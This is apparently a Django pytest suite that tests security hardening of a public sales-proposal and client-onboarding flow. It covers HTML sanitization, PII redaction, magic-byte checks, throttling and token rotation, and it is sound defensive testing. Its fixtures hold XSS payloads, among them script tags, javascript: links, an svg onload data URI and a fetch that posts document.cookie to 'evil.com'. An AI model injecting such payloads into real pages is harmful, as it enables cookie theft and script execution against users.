"""Testes F7B — hardening do fluxo de proposta publica.

Cobre:
- F7B.1: botão "Aceito proposta" tem target=_blank
- F7B.2: GET de onboarding pos-submit retorna payload minimo (sem PII)
- F7B.2: response publico de proposta nao retorna view_count
- F7B.3: upload HTML sanitiza script/iframe/handlers; valida magic bytes
- F7B.4: submit + sync customer e' atomico (rollback se sync falha)
- F7B.4: rejeita submit com customer_id divergente
- F7B.5: throttle por token (visualizacao + submit) com cache key dedicada
- F7B.5: logs nao vazam razao social/CNPJ/CPF em texto-plano
- F7B.6: endpoint regenerate-token rotaciona, audita e invalida link antigo
"""
from __future__ import annotations

import uuid
from unittest.mock import patch

import pytest
from django.contrib.auth import get_user_model
from django.core.files.uploadedfile import SimpleUploadedFile
from django.utils import timezone
from rest_framework import status
from rest_framework.test import APIClient

from core.models import AuditLog
from sales.html_sanitizer import sanitize_proposal_html
from sales.models import (
    ClientOnboarding,
    Customer,
    Proposal,
    Prospect,
)

User = get_user_model()


# ─── Fixtures ─────────────────────────────────────────────────────────────


@pytest.fixture
def api_client():
    return APIClient()


@pytest.fixture
def admin_user(db):
    return User.objects.create_user(
        username='s7b_admin', email='s7b@admin.com',
        password='pass12345', role='admin',
    )


@pytest.fixture
def operator_user(db):
    return User.objects.create_user(
        username='s7b_op', email='s7b@op.com',
        password='pass12345', role='operator',
    )


@pytest.fixture
def admin_client(api_client, admin_user):
    api_client.force_authenticate(user=admin_user)
    return api_client


@pytest.fixture
def operator_client(api_client, operator_user):
    api_client.force_authenticate(user=operator_user)
    return api_client


@pytest.fixture
def customer(db, admin_user):
    return Customer.objects.create(
        company_name='ACME S7B Ltda',
        customer_type='PJ',
        email='acme-s7b@test.com',
        created_by=admin_user,
    )


@pytest.fixture
def prospect(db, admin_user, customer):
    return Prospect.objects.create(
        company_name='Prospect S7B',
        contact_name='Joao S7B',
        contact_email='joao@s7b.com',
        customer=customer,
        created_by=admin_user,
    )


@pytest.fixture
def proposal(db, admin_user, prospect, customer):
    return Proposal.objects.create(
        prospect=prospect,
        customer=customer,
        number='PROP-S7B-0001',
        title='Proposta S7B',
        proposal_type='software_dev',
        billing_type='fixed',
        total_value=10000,
        valid_until=timezone.now().date(),
        created_by=admin_user,
        public_token=uuid.uuid4(),
        status='sent',
    )


@pytest.fixture
def onboarding(db, admin_user, prospect, customer):
    return ClientOnboarding.objects.create(
        prospect=prospect,
        customer=customer,
        created_by=admin_user,
    )


# ─── F7B.1: botão aceito proposta tem target=_blank ────────────────────────


@pytest.mark.django_db
class TestAcceptButtonTarget:
    def test_inject_cta_includes_target_blank_for_onboarding_link(
        self, proposal, onboarding,
    ):
        from sales.views_public import ProposalPublicHTMLView
        view = ProposalPublicHTMLView()
        # HTML minimo
        html = b'<html><body><h1>Proposta</h1></body></html>'
        result = view._inject_cta_buttons(html, proposal).decode()
        # Botao aceito deve abrir em nova aba (corrige bug F7B.1)
        assert 'Aceito proposta de investimento' in result
        # Garantir target=_blank no botao de onboarding (entre </h1> e </body>)
        # WhatsApp ja tinha target=_blank — agora ambos tem
        target_blank_count = result.count('target="_blank"')
        assert target_blank_count >= 2, (
            f'Esperado >=2 target="_blank" (onboarding + WhatsApp), encontrei {target_blank_count}'
        )
        # rel noopener noreferrer no link de onboarding
        assert 'rel="noopener noreferrer"' in result


# ─── F7B.2: IDOR / LGPD ───────────────────────────────────────────────────


@pytest.mark.django_db
class TestPublicEndpointsLGPD:
    def test_proposal_public_response_omits_view_count(
        self, api_client, proposal,
    ):
        # Anexa um arquivo dummy para passar a check de proposal_file
        proposal.proposal_file = SimpleUploadedFile(
            'p.html', b'<html></html>', content_type='text/html',
        )
        proposal.save()
        resp = api_client.get(
            f'/api/v1/sales/proposals/public/{proposal.public_token}/',
        )
        assert resp.status_code == status.HTTP_200_OK
        body = resp.json()
        assert 'view_count' not in body, (
            'view_count nao deve aparecer em endpoint publico (telemetria interna)'
        )
        assert 'number' in body
        assert 'title' in body

    def test_onboarding_get_pre_submit_returns_full_data(
        self, api_client, onboarding,
    ):
        resp = api_client.get(
            f'/api/v1/sales/onboarding/public/{onboarding.public_token}/',
        )
        assert resp.status_code == status.HTTP_200_OK
        body = resp.json()
        # Pre-submit, todos os campos editaveis sao retornados
        assert 'company_legal_name' in body
        assert 'rep_cpf' in body
        assert 'finance_contact_email' in body

    def test_onboarding_get_post_submit_redacts_pii(
        self, api_client, onboarding,
    ):
        # Marca como submitted com dados preenchidos
        onboarding.status = 'submitted'
        onboarding.company_legal_name = 'Empresa Sensivel SA'
        onboarding.company_cnpj = '12.345.678/0001-99'
        onboarding.rep_cpf = '123.456.789-00'
        onboarding.finance_contact_email = 'cfo@sensivel.com'
        onboarding.submitted_at = timezone.now()
        onboarding.save()

        resp = api_client.get(
            f'/api/v1/sales/onboarding/public/{onboarding.public_token}/',
        )
        assert resp.status_code == status.HTTP_200_OK
        body = resp.json()
        # Pos-submit, response deve ser minimo — nada de CNPJ/CPF/email
        assert body.get('status') == 'submitted'
        assert 'prospect_company_name' in body
        # PII deve estar AUSENTE
        for forbidden in (
            'company_cnpj', 'rep_cpf', 'finance_contact_email',
            'company_legal_name', 'rep_full_name',
            'finance_contact_phone', 'rep_street',
        ):
            assert forbidden not in body, (
                f'F7B.2: {forbidden} nao pode aparecer pos-submit (LGPD)'
            )


# ─── F7B.3: Sanitização de HTML upload ────────────────────────────────


class TestHtmlSanitizer:
    def test_strips_script_tags(self):
        html = '<html><body><h1>Oi</h1><script>alert(1)</script></body></html>'
        result = sanitize_proposal_html(html)
        # bleach strip remove a tag mas pode preservar texto interno como
        # texto inerte. O que importa e' que <script> nao executa mais.
        assert '<script' not in result
        assert '</script>' not in result
        assert '<h1>Oi</h1>' in result

    def test_strips_iframe_object_embed(self):
        html = (
            '<html><body>'
            '<iframe src="evil.com"></iframe>'
            '<object data="evil.swf"></object>'
            '<embed src="evil.svg">'
            '</body></html>'
        )
        result = sanitize_proposal_html(html)
        assert '<iframe' not in result
        assert '<object' not in result
        assert '<embed' not in result


# ─── F7B.4: Cobertura de templates modernos ──────────────────────────────────


class TestF7B4SanitizerCoverage:
    """Cobre os gaps achados na auditoria — templates de marketing modernos
    que estavam sendo mutilados pelo sanitizer original."""

    def test_script_pre_strip_removes_js_from_text(self):
        """F7B.4 fix: bleach com strip=True deixava o JS aparecer como TEXTO
        depois de remover a tag. Agora pre-process remove o bloco completo."""
        html = (
            '<section><h1>Hero</h1></section>'
            '<script>document.querySelectorAll(".section").forEach(s=>s.classList.add("v"))</script>'
            '<section>Features</section>'
        )
        result = sanitize_proposal_html(html)
        # Nem tag nem conteudo JS sobreviveram
        assert '<script' not in result
        assert 'querySelectorAll' not in result
        assert 'document.' not in result
        # Conteudo das secoes preservado
        assert '<h1>Hero</h1>' in result
        assert '>Features<' in result

    def test_noscript_block_stripped(self):
        """<noscript> tambem e' pre-strip — irrelevante na nossa arquitetura
        (iframe sandbox sempre bloqueia JS)."""
        html = '<section>OK</section><noscript>JS desligado</noscript>'
        result = sanitize_proposal_html(html)
        assert '<noscript' not in result
        assert 'JS desligado' not in result
        assert '<section>OK</section>' in result

    def test_script_orphan_open_tag_stripped(self):
        """Tag <script> sem fechamento (orfa) tambem e' removida."""
        html = '<section><script src="x.js"></section>'
        result = sanitize_proposal_html(html)
        assert '<script' not in result

    def test_reveal_fix_css_injected_when_script_removed(self):
        """Quando removemos um <script>, injetamos CSS reveal-fix pra
        neutralizar 'hide com CSS, mostra com JS'."""
        html = (
            '<html><body>'
            '<style>.hidden{opacity:0}</style>'
            '<script>$(".hidden").show()</script>'
            '<section>Hero</section>'
            '<section class="hidden">Features</section>'
            '</body></html>'
        )
        result = sanitize_proposal_html(html)
        # Reveal-fix injetado com marker identificavel
        assert 'data-injected="reveal-fix"' in result
        # Cobre os patterns mais comuns
        assert '.hidden' in result and '!important' in result
        assert '[data-aos]' in result
        # Reveal-fix vem DEPOIS do conteudo (apendado no fim — bleach strippa
        # <body>/<html> do fragmento, entao a posicao relativa e' garantida
        # pelo append no final). Verificar que o conteudo precede o fix:
        assert result.index('Features') < result.index('data-injected="reveal-fix"')

    def test_reveal_fix_NOT_injected_when_no_script(self):
        """Sem <script> no input, nao injeta CSS extra (evita bloat)."""
        html = '<html><body><section>Hero</section></body></html>'
        result = sanitize_proposal_html(html)
        assert 'data-injected="reveal-fix"' not in result

    def test_svg_inline_preserved(self):
        """SVG inline (icones, ilustracoes) preservado com viewBox + path d."""
        html = (
            '<section><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">'
            '<path d="M5 12h14" stroke="#000" stroke-width="2"/>'
            '<circle cx="12" cy="12" r="10"/>'
            '</svg></section>'
        )
        result = sanitize_proposal_html(html)
        assert '<svg' in result
        assert 'viewBox=' in result
        assert '<path' in result
        assert 'd="M5 12h14"' in result
        assert '<circle' in result
        assert 'cx="12"' in result

    def test_picture_source_responsive_images_preserved(self):
        """<picture> + <source> (imagens responsivas) preservados."""
        html = (
            '<picture>'
            '<source media="(min-width:600px)" srcset="big.jpg">'
            '<source media="(min-width:300px)" srcset="med.jpg">'
            '<img src="small.jpg" alt="" loading="lazy" decoding="async">'
            '</picture>'
        )
        result = sanitize_proposal_html(html)
        assert '<picture>' in result
        assert '<source' in result
        assert 'srcset=' in result
        assert 'media=' in result
        assert 'loading="lazy"' in result
        assert 'decoding="async"' in result

    def test_data_attrs_preserved(self):
        """data-* preservados — inertes sem JS, seguros."""
        html = (
            '<section data-aos="fade-up" data-delay="200" data-custom-x="y">'
            '<h1 data-text="hero">Hero</h1></section>'
        )
        result = sanitize_proposal_html(html)
        assert 'data-aos="fade-up"' in result
        assert 'data-delay="200"' in result
        assert 'data-custom-x="y"' in result
        assert 'data-text="hero"' in result

    def test_aria_attrs_preserved(self):
        """aria-* preservados (acessibilidade) em tags que ficam na allow-list.
        button nao e' permitido (forms ficam fora), mas section/div sim."""
        html = '<section role="banner" aria-label="hero" aria-hidden="false">x</section>'
        result = sanitize_proposal_html(html)
        assert 'role="banner"' in result
        assert 'aria-label="hero"' in result
        assert 'aria-hidden="false"' in result

    def test_css_variables_inline_preserved(self):
        """CSS variables (--*) em inline style preservadas — def E reference."""
        html = (
            '<section style="--bg: #fff; --pad: 2rem; '
            'background: var(--bg); padding: var(--pad)">x</section>'
        )
        result = sanitize_proposal_html(html)
        assert '--bg' in result
        assert '--pad' in result
        assert 'var(--bg)' in result
        assert 'var(--pad)' in result

    def test_modern_css_properties_preserved(self):
        """Propriedades CSS modernas (aspect-ratio, gap, filter, etc) preservadas."""
        html = (
            '<section style="aspect-ratio: 16/9; gap: 2rem; '
            'filter: brightness(1.1); backdrop-filter: blur(10px); '
            'inset: 0; place-items: center; clip-path: inset(0)">x</section>'
        )
        result = sanitize_proposal_html(html)
        for prop in (
            'aspect-ratio', 'gap', 'filter', 'backdrop-filter',
            'inset', 'place-items', 'clip-path',
        ):
            assert prop in result, f'Propriedade {prop} foi removida do CSS'

    def test_keyframes_animations_preserved(self):
        """@keyframes + animation em <style> preservados."""
        html = (
            '<style>'
            '@keyframes fadeIn { from { opacity: 0 } to { opacity: 1 } }'
            '.box { animation: fadeIn 1s ease forwards }'
            '</style>'
            '<div class="box">x</div>'
        )
        result = sanitize_proposal_html(html)
        assert '@keyframes fadeIn' in result
        assert 'animation:' in result.replace(' ', '')

    def test_media_queries_preserved(self):
        """@media queries preservadas pra responsividade funcionar."""
        html = (
            '<style>'
            '@media (min-width: 768px) { .grid { display: grid } }'
            '@media (max-width: 480px) { .hidden-mobile { display: none } }'
            '</style>'
            '<div class="grid hidden-mobile">x</div>'
        )
        result = sanitize_proposal_html(html)
        assert '@media' in result
        assert 'min-width' in result
        assert 'max-width' in result

    def test_event_handlers_stripped(self):
        """on* handlers continuam removidos (segurança)."""
        html = '<a href="x" onclick="alert(1)" onmouseover="x()">click</a>'
        result = sanitize_proposal_html(html)
        assert 'onclick' not in result
        assert 'onmouseover' not in result
        assert '<a' in result and '>click</a>' in result

    def test_javascript_scheme_stripped(self):
        """javascript: e vbscript: continuam removidos."""
        html = (
            '<a href="javascript:alert(1)">x</a>'
            '<a href="vbscript:msgbox(1)">y</a>'
            '<a href="https://safe.com">z</a>'
        )
        result = sanitize_proposal_html(html)
        assert 'javascript:' not in result.lower()
        assert 'vbscript:' not in result.lower()
        # Link seguro preservado
        assert 'https://safe.com' in result

    def test_data_uri_blocked(self):
        """data: URI continua bloqueada (vetor de injection histórico)."""
        html = '<img src="data:text/html,<svg/onload=alert(1)>">'
        result = sanitize_proposal_html(html)
        assert 'data:' not in result

    def test_full_landing_page_smoke_test(self):
        """End-to-end: input com hero + features escondidas → output com tudo
        renderizavel (sem JS, mas com reveal-fix CSS injetado)."""
        html = '''<!DOCTYPE html>
<html>
<head>
<title>Proposta</title>
<style>
:root { --primary: #A6864A; --gap: 2rem }
.hidden-on-load { opacity: 0 }
@media (min-width: 768px) { .grid { display: grid; gap: var(--gap) } }
</style>
</head>
<body>
<section class="hero" style="background: var(--primary)">
  <h1>Hero — sempre visivel</h1>
  <svg viewBox="0 0 24 24"><path d="M5 12h14"/></svg>
</section>
<script>
document.querySelectorAll('.hidden-on-load').forEach(el => {
  el.style.opacity = '1';
});
</script>
<section class="hidden-on-load grid" data-aos="fade-up">
  <h2>Features — escondida via JS</h2>
  <picture>
    <source media="(min-width:600px)" srcset="big.jpg">
    <img src="small.jpg" alt="">
  </picture>
</section>
<section class="hidden-on-load" data-animation="slide-up">
  <h2>Pricing — tambem escondida</h2>
</section>
</body>
</html>'''
        result = sanitize_proposal_html(html)

        # Hero intacto
        assert 'Hero — sempre visivel' in result
        # Features e Pricing presentes (texto preservado)
        assert 'Features — escondida via JS' in result
        assert 'Pricing — tambem escondida' in result
        # SVG inline preservado
        assert '<svg' in result and 'd="M5 12h14"' in result
        # Picture/source preservados
        assert '<picture>' in result and '<source' in result
        # CSS vars preservadas
        assert '--primary' in result
        # Script removido completamente
        assert '<script' not in result
        assert 'querySelectorAll' not in result
        # Reveal-fix CSS injetado pra mostrar `.hidden-on-load`/`data-aos`/`data-animation`
        assert 'data-injected="reveal-fix"' in result
        # Data attrs preservados
        assert 'data-aos="fade-up"' in result
        assert 'data-animation="slide-up"' in result

    def test_strips_event_handlers(self):
        html = '<html><body><p onclick="alert(1)" onmouseover="x()">Ola</p></body></html>'
        result = sanitize_proposal_html(html)
        assert 'onclick' not in result
        assert 'onmouseover' not in result
        assert '<p' in result  # tag fica, atributos somem
        assert 'Ola' in result

    def test_strips_javascript_href(self):
        html = '<html><body><a href="javascript:alert(1)">click</a></body></html>'
        result = sanitize_proposal_html(html)
        assert 'javascript:' not in result.lower()

    def test_keeps_safe_styles(self):
        html = '<html><body><div style="color: red; padding: 20px;">x</div></body></html>'
        result = sanitize_proposal_html(html)
        assert 'color' in result
        assert 'padding' in result

    def test_strips_meta_http_equiv(self):
        html = '<html><head><meta http-equiv="refresh" content="0;url=evil.com"></head><body>x</body></html>'
        result = sanitize_proposal_html(html)
        assert '<meta' not in result.lower()

    def test_accepts_bytes_input(self):
        result = sanitize_proposal_html(b'<p>ola</p>')
        assert isinstance(result, str)
        assert '<p>ola</p>' in result


@pytest.mark.django_db
class TestPublicHtmlSanitizedOnTheFly:
    """F7B.3 (extensao): garante que propostas ANTIGAS — uploadadas antes
    do deploy do F7B, sem sanitizacao na origem — sao sanitizadas on-the-fly
    no GET. Sem isso, HTML pre-existente continuaria com tags perigosas mesmo
    apos o deploy."""

    def test_old_html_with_script_is_sanitized_when_served(
        self, api_client, proposal,
    ):
        # Simula proposta antiga: salva arquivo SEM passar por sanitize.
        # `.save()` direto no FileField bypassa o upload_pdf — replica o
        # estado do banco antes do deploy.
        evil_html = (
            b'<html><body><h1>Proposta Antiga</h1>'
            b'<script>fetch("attacker.com")</script>'
            b'<iframe src="evil.com"></iframe>'
            b'<a href="javascript:alert(1)">click</a>'
            b'</body></html>'
        )
        proposal.proposal_file = SimpleUploadedFile(
            'old.html', evil_html, content_type='text/html',
        )
        proposal.save()

        # Aponta GET publico
        resp = api_client.get(
            f'/api/v1/sales/proposals/public/{proposal.public_token}/html/',
        )
        assert resp.status_code == status.HTTP_200_OK
        served = resp.content
        # Tags perigosas devem ter sido removidas no serve
        assert b'<script' not in served
        assert b'</script>' not in served
        assert b'<iframe' not in served
        assert b'javascript:' not in served.lower()
        # Conteudo legitimo preservado
        assert b'<h1>Proposta Antiga</h1>' in served

    def test_old_html_keeps_cta_injection_after_sanitize(
        self, api_client, proposal, onboarding,
    ):
        # Mesmo apos sanitizar, os botoes CTA continuam sendo injetados.
        proposal.proposal_file = SimpleUploadedFile(
            'old.html', b'<html><body><p>velho</p></body></html>',
            content_type='text/html',
        )
        proposal.save()
        resp = api_client.get(
            f'/api/v1/sales/proposals/public/{proposal.public_token}/html/',
        )
        assert resp.status_code == status.HTTP_200_OK
        # Botao "Aceito proposta" injetado com target=_blank (F7B.1)
        assert b'Aceito proposta de investimento' in resp.content
        assert b'target="_blank"' in resp.content


@pytest.mark.django_db
class TestUploadMagicBytes:
    URL = '/api/v1/sales/proposals/{id}/upload-pdf/'

    def test_pdf_with_wrong_magic_bytes_rejected(
        self, admin_client, proposal,
    ):
        fake_pdf = SimpleUploadedFile(
            'fake.pdf', b'NOT_A_PDF_HEADER\x00\x01',
            content_type='application/pdf',
        )
        resp = admin_client.post(
            self.URL.format(id=proposal.id),
            {'proposal_file': fake_pdf}, format='multipart',
        )
        assert resp.status_code == status.HTTP_400_BAD_REQUEST
        assert 'magic bytes' in resp.json().get('error', '').lower()

    def test_html_disguised_as_binary_rejected(
        self, admin_client, proposal,
    ):
        # PNG header em arquivo .html
        fake_html = SimpleUploadedFile(
            'fake.html', b'\x89PNG\r\n\x1a\n<html>',
            content_type='text/html',
        )
        resp = admin_client.post(
            self.URL.format(id=proposal.id),
            {'proposal_file': fake_html}, format='multipart',
        )
        assert resp.status_code == status.HTTP_400_BAD_REQUEST

    def test_legitimate_html_with_script_is_sanitized_on_save(
        self, admin_client, proposal,
    ):
        evil_html = (
            b'<html><body><h1>Proposta</h1>'
            b'<script>fetch("evil.com",{method:"POST",body:document.cookie})</script>'
            b'</body></html>'
        )
        f = SimpleUploadedFile('p.html', evil_html, content_type='text/html')
        resp = admin_client.post(
            self.URL.format(id=proposal.id),
            {'proposal_file': f}, format='multipart',
        )
        assert resp.status_code == status.HTTP_200_OK, resp.content
        proposal.refresh_from_db()
        proposal.proposal_file.open('rb')
        try:
            saved = proposal.proposal_file.read()
        finally:
            proposal.proposal_file.close()
        # As tags <script> e </script> tem que ter sido removidas. O texto
        # interno pode sobreviver como texto inerte — o que vale e' que o
        # browser nao executara mais (sem tag = sem JS).
        assert b'<script' not in saved
        assert b'</script>' not in saved
        assert b'<h1>Proposta</h1>' in saved


# ─── F7B.4: Atomicidade ────────────────────────────────────────────────────


@pytest.mark.django_db
class TestAtomicSubmit:
    def _payload(self):
        return {
            'company_legal_name': 'Empresa Atomica SA',
            'company_cnpj': '11.222.333/0001-44',
            'company_street': 'Rua A',
            'company_number': '100',
            'company_complement': 'Sala 1',
            'company_neighborhood': 'Centro',
            'company_city': 'Curitiba',
            'company_state': 'PR',
            'company_cep': '80000-000',
            'rep_full_name': 'Maria',
            'rep_marital_status': 'casado',
            'rep_profession': 'CEO',
            'rep_cpf': '111.444.777-35',
            'rep_street': 'Rua B',
            'rep_number': '50',
            'rep_complement': 'Apto 1',
            'rep_neighborhood': 'Jardim',
            'rep_city': 'Curitiba',
            'rep_state': 'PR',
            'rep_cep': '80100-000',
            'finance_contact_name': 'Joao',
            'finance_contact_phone': '(41) 99999-9999',
            'finance_contact_email': 'joao@a.com',
        }

    def test_submit_rejects_inconsistent_customer_link(
        self, api_client, onboarding, prospect, admin_user,
    ):
        # Cria outro customer, vincula ao onboarding mas nao ao prospect
        other_customer = Customer.objects.create(
            company_name='Other', customer_type='PJ',
            email='other@x.com', created_by=admin_user,
        )
        onboarding.customer = other_customer
        onboarding.save()
        # prospect.customer continua sendo o original — divergencia

        resp = api_client.post(
            f'/api/v1/sales/onboarding/public/{onboarding.public_token}/',
            self._payload(), format='json',
        )
        assert resp.status_code == status.HTTP_409_CONFLICT
        onboarding.refresh_from_db()
        assert onboarding.status == 'pending', (
            'Submit divergente NAO deveria marcar como submitted'
        )

    def test_submit_rolls_back_when_sync_fails(
        self, api_client, onboarding,
    ):
        # Bypass a validacao de CPF/CNPJ — o teste foca em transacionalidade,
        # nao em validacao do form. Mocka serializer.is_valid e save() pra
        # simular submit valido que muda o status, e injeta erro em sync.
        from sales.views_public import ClientOnboardingPublicView

        def fake_save(**kwargs):
            for key, value in kwargs.items():
                setattr(onboarding, key, value)
            onboarding.company_legal_name = 'Empresa Atomica'
            onboarding.save()

        with patch.object(
            ClientOnboardingPublicView,
            '_sync_customer',
            side_effect=RuntimeError('DB exploded'),
        ), patch(
            'sales.views_public.ClientOnboardingPublicSerializer.is_valid',
            return_value=True,
        ), patch(
            'sales.views_public.ClientOnboardingPublicSerializer.save',
            side_effect=fake_save,
        ):
            resp = api_client.post(
                f'/api/v1/sales/onboarding/public/{onboarding.public_token}/',
                self._payload(), format='json',
            )
        assert resp.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR, (
            f'Esperava 500, recebi {resp.status_code}: {resp.content!r}'
        )
        onboarding.refresh_from_db()
        # Falha em sync deve fazer rollback do status — transacao atomica
        # tem que reverter tanto o save() do serializer quanto qualquer
        # update intermediario.
        assert onboarding.status == 'pending', (
            f'Falha em sync deve rollback. Status atual: {onboarding.status}'
        )


# ─── F7B.5: Throttle por token + mask PII ─────────────────────────────────


@pytest.mark.django_db
class TestThrottlePerToken:
    def test_throttle_class_uses_token_in_cache_key(self):
        from sales.views_public import (
            OnboardingTokenSubmitThrottle,
            ProposalTokenViewThrottle,
        )

        class FakeRequest:
            method = 'POST'

        class FakeView:
            kwargs = {'token': 'abc-123'}

        # Cache key deve incluir o token — separa rate-limit por proposta/onboarding
        view_throttle = ProposalTokenViewThrottle()
        key = view_throttle.get_cache_key(FakeRequest(), FakeView())
        assert 'abc-123' in key
        assert 'proposal_view' in key

        submit_throttle = OnboardingTokenSubmitThrottle()
        key = submit_throttle.get_cache_key(FakeRequest(), FakeView())
        assert 'abc-123' in key
        assert 'onboarding_submit' in key


class TestMaskCompanyName:
    def test_mask_preserves_first_and_last(self):
        from core.logging_utils import mask_company_name
        assert mask_company_name('Inova Systems Solutions') == 'In***s'
        assert mask_company_name('') == '[no-company]'
        assert mask_company_name('AB') == 'A*'


# ─── F7B.6: regenerate-token ──────────────────────────────────────────────


@pytest.mark.django_db
class TestRegenerateToken:
    URL = '/api/v1/sales/proposals/{id}/regenerate-token/'

    def test_admin_can_regenerate(self, admin_client, proposal):
        old_token = str(proposal.public_token)
        resp = admin_client.post(self.URL.format(id=proposal.id))
        assert resp.status_code == status.HTTP_200_OK, resp.content
        new_token = resp.json()['public_token']
        assert new_token != old_token
        proposal.refresh_from_db()
        assert str(proposal.public_token) == new_token

    def test_creates_audit_log(self, admin_client, proposal, admin_user):
        admin_client.post(self.URL.format(id=proposal.id))
        log = AuditLog.objects.filter(
            user=admin_user, action='regenerate_proposal_token',
            resource_type='proposal', resource_id=proposal.id,
        ).first()
        assert log is not None, 'Audit log nao foi criado'

    def test_old_token_returns_404_after_rotation(
        self, api_client, admin_client, proposal,
    ):
        # Anexar arquivo
        proposal.proposal_file = SimpleUploadedFile(
            'p.html', b'<html></html>', content_type='text/html',
        )
        proposal.save()
        old_token = str(proposal.public_token)
        # Token velho funciona
        resp = api_client.get(f'/api/v1/sales/proposals/public/{old_token}/')
        assert resp.status_code == status.HTTP_200_OK

        # Rotacionar
        admin_client.post(self.URL.format(id=proposal.id))

        # Token velho ja nao funciona mais
        resp = api_client.get(f'/api/v1/sales/proposals/public/{old_token}/')
        assert resp.status_code == status.HTTP_404_NOT_FOUND
